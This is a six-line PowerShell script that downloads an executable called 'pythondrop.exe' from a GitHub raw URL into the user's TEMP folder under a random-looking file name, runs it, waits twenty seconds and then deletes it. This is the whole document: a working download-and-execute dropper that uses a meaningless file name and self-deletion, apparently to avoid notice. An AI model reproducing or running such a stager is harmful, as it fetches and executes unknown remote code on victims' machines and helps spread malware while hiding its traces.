$dest = $env:TEMP + "\tytykjrklgddgdg.exe"
Start-BitsTransfer -Source https://github.com/piplup312/tomandjerry/raw/main/pythondrop.exe -Destination $dest
cd ($env:TEMP)
.\tytykjrklgddgdg.exe
Start-Sleep -s 20
rm .\tytykjrklgddgdg.exe